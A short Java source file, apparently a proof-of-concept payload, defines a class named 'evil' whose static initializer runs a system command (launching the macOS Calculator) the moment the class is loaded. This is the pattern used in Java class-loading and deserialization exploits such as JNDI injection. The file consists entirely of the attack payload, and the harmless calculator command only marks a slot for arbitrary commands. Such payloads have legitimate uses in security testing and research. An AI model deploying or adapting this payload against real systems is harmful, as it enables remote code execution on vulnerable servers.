import java.lang.Runtime;
import java.lang.Process;

public class evil {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] cmd = {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"};
            Process pc = rt.exec(cmd);
            pc.waitFor();
        }catch (Exception ignored){

        }
    }
}
